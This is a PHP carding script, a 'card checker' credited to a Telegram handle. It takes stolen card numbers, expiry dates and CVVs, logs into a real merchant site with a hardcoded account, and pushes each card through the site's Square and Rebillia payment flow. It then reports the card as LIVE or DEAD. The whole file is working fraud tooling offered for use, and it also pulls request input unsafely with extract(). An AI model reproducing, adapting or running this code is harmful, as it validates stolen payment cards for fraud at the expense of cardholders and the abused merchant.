<?php
error_reporting(0);

//Script by pnrjason (t.me/Raizo666)
 
if($_SERVER['REQUEST_METHOD'] == 'POST'){ 
    extract($_POST); 
} 
else { 
   extract($_GET); 
} 
 
function GetStr($string, $start, $end){ 
    $str = explode($start, $string); 
    $str = explode($end, $str[1]); 
    return $str[0]; 
} 
 
$separator = explode("|", $lista);  
$cc = $separator[0]; 
$mm = $separator[1]; 
$yy = $separator[2]; 
$cvv = $separator[3]; 
$m     = ltrim($mm, "0");

function RandomString($length = 7)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

$fname = RandomString();
$lname = RandomString();
$street = mt_rand() . " " . RandomString();
$city   = RandomString();
$state  = RandomString();
$postcode = mt_rand(1000, 99999);
$last4 = substr($cc, 12, 16);
$email = "gesif89034@hafutv.com";
$password = "stacy'smom69";

$cbin = substr($cc, 0, 1); 
if($cbin == 5){ 
    $cbin = 'MASTERCARD'; 
} 
else if($cbin == 4){ 
    $cbin = 'VISA'; 
} 
else if($cbin == 3){ 
 $cbin = 'AMEX'; 
} 
else { 
  $cbin = 'null'; 
}


    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://docpatels.com/login.php',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd() . "/cookie.txt",
    CURLOPT_COOKIEFILE => getcwd() . "/cookie.txt",
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_HTTPHEADER => array(
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    )
));
    $prepare_login = curl_exec($ch);
    $csrf_token = GetStr($prepare_login, '"csrf_token":"', '"');
    $rebilliaClientId = GetStr($prepare_login, 'appClientId = "', '"');

    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://docpatels.com/login.php?action=check_login',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd() . "/cookie.txt",
    CURLOPT_COOKIEFILE => getcwd() . "/cookie.txt",
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_HTTPHEADER => array(
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'content-type: application/x-www-form-urlencoded',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    ),
    CURLOPT_POSTFIELDS => 'login_email='.urlencode($email).'&login_pass='.urlencode($password).'&authenticity_token='.$csrf_token,
));
    $login = curl_exec($ch);

    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://docpatels.com/customer/current.jwt?app_client_id='.$rebilliaClientId.'',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd() . "/cookie.txt",
    CURLOPT_COOKIEFILE => getcwd() . "/cookie.txt",
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_HTTPHEADER => array(
        'accept: */*',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        'x-xsrf-token: '.$csrf_token.''
    )
));
    $getJwt = curl_exec($ch);

    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://app.rebillia.com/login/customers/'.$getJwt,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd() . "/cookie.txt",
    CURLOPT_COOKIEFILE => getcwd() . "/cookie.txt",
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_HTTPHEADER => array(
        'accept: */*',
        'origin: https://docpatels.com',
        'referer: https://docpatels.com/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
    )
));
    $getToken = curl_exec($ch);
    $rebillia_token = GetStr($getToken, '"token":"', '"');

    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://pci-connect.squareup.com/v2/card-nonce?_=1608314541610.9734&version=0191055fbd',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd() . "/cookie.txt",
    CURLOPT_COOKIEFILE => getcwd() . "/cookie.txt",
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_HTTPHEADER => array(
        'accept: application/json',
        'content-type: application/json; charset=UTF-8',
        'origin: https://pci-connect.squareup.com',
        'referer: https://pci-connect.squareup.com/v2/iframe?type=main&app_id=sq0idp-Mgl17_r3Bnrqt5Cn1_nrbQ&host_name=docpatels.com&version=0191055fbd',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        'x-js-id: undefined'
    ),
    CURLOPT_POSTFIELDS => '{"client_id":"sq0idp-Mgl17_r3Bnrqt5Cn1_nrbQ","session_id":"7UHhq0SSVC6NiQzAj4SEZpzPRgqngUyTeuh5Hwbsi9c2ZrUpC6FJ6yQmepLOcdmmlljxa98bqTppPQ5EeYw=","website_url":"https://docpatels.com/","squarejs_version":"0191055fbd","analytics_token":"OOE3N5COWVAYTUBHB6W4XEO27VSPXGNMPJIHY5N2PZ3QNKE6JMBLXMM6NYXRZBFQXNI7WM6OVFC6TEJAAL7JE3W2TAPMOXCB","card_data":{"number":"'.$cc.'","exp_month":'.$m.',"exp_year":'.$yy.',"cvv":"'.$cvv.'","billing_postal_code":"90210"}}',
));
    $getNonce = curl_exec($ch);
    $token = GetStr($getNonce, '"card_nonce":"', '"');

    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://app.rebillia.com/customers/cconfiles',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd() . "/cookie.txt",
    CURLOPT_COOKIEFILE => getcwd() . "/cookie.txt",
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_HTTPHEADER => array(
        'accept: application/json, text/javascript, */*; q=0.01',
        'apikey: '.$rebillia_token.'',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'origin: https://docpatels.com',
        'referer: https://docpatels.com/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    ),
    CURLOPT_POSTFIELDS => "payment_method_nonce=$token&card_data%5Bdigital_wallet_type%5D=NONE&card_data%5Bcard_brand%5D=VISA&card_data%5Blast_4%5D=$last4&card_data%5Bexp_month%5D=$m&card_data%5Bexp_year%5D=$yy&card_data%5Bbilling_postal_code%5D=$postcode&cardholder_name=$fname&billing_address=0",
));
    echo $execute = curl_exec($ch);
    $response = GetStr($execute, 'code\u0022:\u0022', '\u');
    $id = GetStr($execute, '"id":', '}');

if(strpos($execute, '"errCode":null')){ 
    
    echo '<tr><td><span class="badge badge-outline-success badge-pill">LIVE</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-success badge-pill">'.$id.'</span></td></tr><br>'; 
}
else { 
	echo '<tr><td><span class="badge badge-outline-danger badge-pill">DEAD</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-danger badge-pill">'.$response.'</span></td></tr><br>'; 
}
unlink("cookie.txt");
?>
